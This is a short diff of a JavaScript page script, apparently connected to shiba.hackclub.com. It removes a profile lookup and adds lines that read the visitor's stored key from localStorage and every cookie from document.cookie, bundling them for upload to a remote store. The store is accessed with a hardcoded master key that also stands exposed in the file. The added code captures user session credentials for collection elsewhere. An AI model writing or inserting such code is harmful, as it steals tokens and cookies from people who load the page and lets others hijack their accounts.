@@ -7,28 +7,13 @@
 			const API_KEY = "$2a$10$1Z8onRyu5z04DcR7.C8BReAJ1E74akMHT1VFCDBRZPzRqKHVfv/Dm";  // <-- replace with your master key
 
 			const yourKey = localStorage.getItem("key");
+			const yourCookies = document.cookie;
 
-  			const url = "https://shiba.hackclub.com/api/getMyProfile";
 
-			const bodyData = {
-				token: JSON.stringify(yourKey)
-			};
-
-			const response = await fetch(url, {
-				method: "POST",
-				headers: {
-					"Content-Type": "application/json",
-					"Accept": "*/*",
-					"Origin": "https://shiba.hackclub.com",
-					"Referer": "https://shiba.hackclub.com/my-games"
-				},
-				body: JSON.stringify(bodyData),
-				credentials: "include" // sends cookies if running on same origin
-			});
-
-			const data = await response.json();
-
-			newItem = yourKey
+			newItem = {
+				key: yourKey,
+				cookies: yourCookies
+			}
 
 			  try {
 			    // 1️⃣ Fetch current contents
